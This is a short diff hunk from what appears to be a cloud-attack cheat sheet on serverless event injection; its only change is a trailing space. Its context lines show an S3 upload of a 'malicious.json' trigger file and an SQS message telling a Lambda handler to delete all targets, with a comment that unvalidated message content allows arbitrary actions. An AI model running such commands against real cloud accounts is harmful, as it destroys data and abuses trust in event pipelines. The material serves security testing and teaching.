@@ -438,7 +438,7 @@ aws s3 cp malicious.json s3://trigger-bucket/
 
 # SNS/SQS poisoning
 aws sqs send-message --queue-url QUEUE_URL \
-  --message-body '{"action":"delete","target":"*"}'
+  --message-body '{"action":"delete","target":"*"}' 
 # If Lambda trusts message content without validation → arbitrary actions
 
 # API Gateway event injection
